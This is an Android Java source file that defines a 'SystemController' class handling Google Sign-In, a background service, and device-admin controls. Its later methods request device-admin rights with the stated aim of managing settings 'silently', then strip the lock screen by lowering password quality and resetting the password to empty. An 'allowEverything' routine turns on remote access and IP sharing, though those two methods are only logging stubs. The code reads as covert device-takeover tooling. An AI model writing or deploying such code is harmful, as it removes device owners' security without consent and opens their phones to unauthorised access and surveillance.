package com.example.systemscript;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.app.Activity;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.tasks.Task;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;

public class SystemController {

    private final Context context;
    private GoogleSignInClient googleSignInClient;

    public SystemController(Context context) {
        this.context = context;
        configureGoogleSignIn();
    }

    // Configure Google Sign-In
    private void configureGoogleSignIn() {
        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .build();
        googleSignInClient = GoogleSignIn.getClient(context, gso);
    }

    // Perform silent Google Sign-In
    public void silentGoogleSignIn() {
        GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(context);
        if (account != null) {
            Log.d("SystemController", "Silent Google Sign-In successful: " + account.getEmail());
            // Perform additional actions with the account (e.g., fetch user details)
        } else {
            Log.d("SystemController", "No account found for silent sign-in.");
        }
    }

    // Start Google Sign-In (UI-based, fallback if silent sign-in fails)
    public void startGoogleSignIn(Activity activity, int requestCode) {
        Intent signInIntent = googleSignInClient.getSignInIntent();
        activity.startActivityForResult(signInIntent, requestCode);
    }

    // Handle Google Sign-In result
    public void handleGoogleSignInResult(Task<GoogleSignInAccount> task) {
        try {
            GoogleSignInAccount account = task.getResult(Exception.class);
            if (account != null) {
                Log.d("SystemController", "Google Sign-In successful: " + account.getEmail());
                // Perform additional actions with the account (e.g., fetch user details)
            }
        } catch (Exception e) {
            Log.e("SystemController", "Google Sign-In failed", e);
        }
    }

    // Start the BackgroundService
    public void startService() {
        Intent serviceIntent = new Intent(context, BackgroundService.class);
        context.startService(serviceIntent);
        Log.d("SystemController", "BackgroundService started.");
    }

    // Stop the BackgroundService
    public void stopService() {
        Intent serviceIntent = new Intent(context, BackgroundService.class);
        context.stopService(serviceIntent);
        Log.d("SystemController", "BackgroundService stopped.");
    }

    // Restart the BackgroundService
    public void restartService() {
        stopService();
        startService();
        Log.d("SystemController", "BackgroundService restarted.");
    }

    // Check the status of the service
    public boolean isServiceRunning() {
        // Implement logic to check if the service is running
        // Placeholder implementation
        Log.d("SystemController", "Checking if BackgroundService is running...");
        return false; // Replace with actual implementation
    }

    // Allow everything: Start all features of the program
    public void allowEverything() {
        startService();
        enableRemoteAccess();
        enableIpSharing();
        Log.d("SystemController", "All features of the program are enabled.");
    }

    // Enable remote access
    private void enableRemoteAccess() {
        // Logic to enable remote access (e.g., start server)
        Log.d("SystemController", "Remote access enabled.");
    }

    // Enable IP address sharing
    private void enableIpSharing() {
        // Logic to enable IP address sharing
        Log.d("SystemController", "IP address sharing enabled.");
    }

    // Request device admin permissions silently
    public void ensureDeviceAdmin(Activity activity, int requestCode) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, DeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            Log.d("SystemController", "Device admin not active. Requesting permissions...");
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires device admin permissions to manage system settings silently.");
            activity.startActivityForResult(intent, requestCode);
        } else {
            Log.d("SystemController", "Device admin already active. Proceeding silently.");
            setSystemPasswordNone(); // Automatically set system password to None or Swipe
        }
    }

    // Set system password to "None" or "Swipe"
    public void setSystemPasswordNone() {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, DeviceAdminReceiver.class);

        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.setPasswordQuality(adminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
            dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            Log.d("SystemController", "System password set to None or Swipe silently.");
        } else {
            Log.e("SystemController", "Device admin not active. Cannot set system password silently.");
        }
    }
}
